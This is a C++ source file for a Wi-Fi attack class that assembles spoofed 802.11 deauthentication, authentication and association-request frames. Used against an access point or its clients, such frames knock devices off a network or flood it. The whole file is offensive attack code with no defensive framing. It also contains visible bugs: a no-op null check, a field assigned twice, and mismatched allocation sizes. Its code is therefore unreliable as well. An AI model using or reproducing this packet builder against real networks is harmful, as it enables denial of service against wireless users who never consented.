#include "DeauthAttack.h"


const dot11_radiotap_hdr DeauthAttack::rtap_hdr = {
    .it_version = 0,
    .it_pad = 0,
    .it_len = 8,
    .it_present = 0
};


DeauthAttack::DeauthAttack(const uint8_t* ap_mac_addr, const uint8_t* st_mac_addr)
{
    this->ap_mac_addr = ap_mac_addr;
    this->st_mac_addr = st_mac_addr;
    if (st_mac_addr == nullptr)
    {
        this->st_mac_addr = st_mac_addr;
    }
}


DeauthAttack::~DeauthAttack()
{

}


void DeauthAttack::init_pkt()
{
    this->deauth_fhdr.base.duration = 0;
    this->deauth_fhdr.frag_seq_num = 0;
    for (size_t i = 0; i < 6; i++)
    {
        this->deauth_fhdr.bssid[i] = ap_mac_addr[i];
    }
    
    switch (this->mode)
    {
    case DEAUTH_ATTACK_AP_TO_BROADCAST:
    case DEAUTH_ATTACK_AP_TO_STATION:
    {
        this->deauth_fhdr.base.fctl_field = DEAUTH_FRAME;
        for (size_t i = 0; i < 6; i++)
        {
            this->deauth_fhdr.rcv_addr[i] = this->st_mac_addr[i];
            this->deauth_fhdr.src_addr[i] = this->ap_mac_addr[i];
        }
        this->wlm_deauth_hdr.reason_code = HANDSHAKE_TIMEOUT;
        break;
    }
    case DEAUTH_ATTACK_STATION_TO_AP:
    {
        this->deauth_fhdr.base.fctl_field = DEAUTH_FRAME;
        for (size_t i = 0; i < 6; i++)
        {
            this->deauth_fhdr.rcv_addr[i] = this->ap_mac_addr[i];
            this->deauth_fhdr.src_addr[i] = this->st_mac_addr[i];
        }
        this->wlm_deauth_hdr.reason_code = CLASS3_NONASSOCIATED_STA;
        break;
    }
    case AUTH_ATTTACK_STATION_TO_AP_AUTH:
    {
        this->deauth_fhdr.base.fctl_field = AUTH_FRAME;
        for (size_t i = 0; i < 6; i++)
        {
            this->deauth_fhdr.rcv_addr[i] = this->ap_mac_addr[i];
            this->deauth_fhdr.src_addr[i] = this->st_mac_addr[i];
        }
        this->wlm_auth_hdr.auth_algo = 0x0000;
        this->wlm_auth_hdr.auth_seq = 0x0001;
        this->wlm_auth_hdr.auth_algo = 0x0000;
        break;
    }
    case AUTH_ATTTACK_STATION_TO_AP_ASSO_REQ:
    {
        this->deauth_fhdr.base.fctl_field = ASSO_REQ_FRAME;
        for (size_t i = 0; i < 6; i++)
        {
            this->deauth_fhdr.rcv_addr[i] = this->ap_mac_addr[i];
            this->deauth_fhdr.src_addr[i] = this->st_mac_addr[i];
        }
        this->wlm_asso_req_hdr.cap_info = 0x1431;
        this->wlm_asso_req_hdr.listen_interval = 0x000a;
        break;
    }
    default:
        break;
    }
    
}


wlan_attack_pkt* DeauthAttack::assemble_pkt()
{
    wlan_attack_pkt* attack_pkt = nullptr;
    switch (this->mode)
    {
    case DEAUTH_ATTACK_AP_TO_BROADCAST:
    case DEAUTH_ATTACK_AP_TO_STATION:
    case DEAUTH_ATTACK_STATION_TO_AP:
    {
        attack_pkt = this->assemble_deauth_attack_pkt();
        break;
    }
    case AUTH_ATTTACK_STATION_TO_AP_AUTH:
    {
        attack_pkt = this->assemble_auth_attack_auth_pkt();
        break;
    }
    case AUTH_ATTTACK_STATION_TO_AP_ASSO_REQ:
    {
        attack_pkt = this->assemble_auth_attack_asso_req_pkt();
        break;
    }
    default:
        break;
    }
    return attack_pkt;
}


wlan_attack_pkt* DeauthAttack::assemble_auth_attack_auth_pkt()
{
    uint64_t pkt_size = sizeof(this->rtap_hdr) + 
        sizeof(this->deauth_fhdr) + 
        sizeof(this->wlm_auth_hdr);

    wlan_attack_pkt* attack_pkt = (wlan_attack_pkt*)malloc(sizeof(wlan_auth_pkt));
    attack_pkt->size = pkt_size;
    attack_pkt->packet = (u_char*)malloc(attack_pkt->size);

    std::memcpy(
        attack_pkt->packet,
        &(this->rtap_hdr),
        sizeof(this->rtap_hdr)
    );

    std::memcpy(
        attack_pkt->packet + sizeof(this->rtap_hdr),
        &(this->deauth_fhdr),
        sizeof(this->deauth_fhdr)
    );

    std::memcpy(
        attack_pkt->packet + sizeof(this->rtap_hdr) + sizeof(this->deauth_fhdr),
        &(this->wlm_auth_hdr),
        sizeof(this->wlm_auth_hdr)
    );
    return attack_pkt;
}


wlan_attack_pkt* DeauthAttack::assemble_auth_attack_asso_req_pkt()
{
    const char* tagged_param_sample =
        "\x00\x00\x01\x08\x82\x84\x8b\x96\x24\x30\x48\x6c\x32\x04\x0c" \
        "\x12\x18\x60";

    uint64_t pkt_size = sizeof(this->rtap_hdr) + 
        sizeof(this->deauth_fhdr) + 
        sizeof(this->wlm_asso_req_hdr) + 
        18; // SAMPLE

    wlan_attack_pkt* attack_pkt = (wlan_attack_pkt*)malloc(sizeof(wlan_auth_pkt));
    attack_pkt->size = pkt_size;
    attack_pkt->packet = (u_char*)malloc(attack_pkt->size);

    std::memcpy(
        attack_pkt->packet,
        &(this->rtap_hdr),
        sizeof(this->rtap_hdr)
    );

    std::memcpy(
        attack_pkt->packet + sizeof(this->rtap_hdr),
        &(this->deauth_fhdr),
        sizeof(this->deauth_fhdr)
    );

    std::memcpy(
        attack_pkt->packet + sizeof(this->rtap_hdr) + sizeof(this->deauth_fhdr),
        &(this->wlm_asso_req_hdr),
        sizeof(this->wlm_asso_req_hdr)
    );


    // SAMPLE
    std::memcpy(
        attack_pkt->packet + sizeof(this->rtap_hdr) + sizeof(this->deauth_fhdr) + sizeof(this->wlm_asso_req_hdr),
        tagged_param_sample,
        18
    );
    

    return attack_pkt;
}

wlan_attack_pkt* DeauthAttack::assemble_deauth_attack_pkt()
{
    uint64_t pkt_size = sizeof(this->rtap_hdr) + 
        sizeof(this->deauth_fhdr) + 
        sizeof(this->wlm_deauth_hdr);

    wlan_attack_pkt* attack_pkt = (wlan_attack_pkt*)malloc(sizeof(wlan_attack_pkt));
    attack_pkt->size = pkt_size;
    attack_pkt->packet = (u_char*)malloc(attack_pkt->size);

    std::memcpy(
        attack_pkt->packet,
        &(this->rtap_hdr),
        sizeof(this->rtap_hdr)
    );

    std::memcpy(
        attack_pkt->packet + sizeof(this->rtap_hdr),
        &(this->deauth_fhdr),
        sizeof(this->deauth_fhdr)
    );

    std::memcpy(
        attack_pkt->packet + sizeof(this->rtap_hdr) + sizeof(this->deauth_fhdr),
        &(this->wlm_deauth_hdr),
        sizeof(this->wlm_deauth_hdr)
    );
    return attack_pkt;
}

wlan_attack_pkt* DeauthAttack::get_pkt(const int mode)
{
    this->mode = mode;
    this->init_pkt();
    wlan_attack_pkt* attack_pkt = assemble_pkt();
    return attack_pkt;
}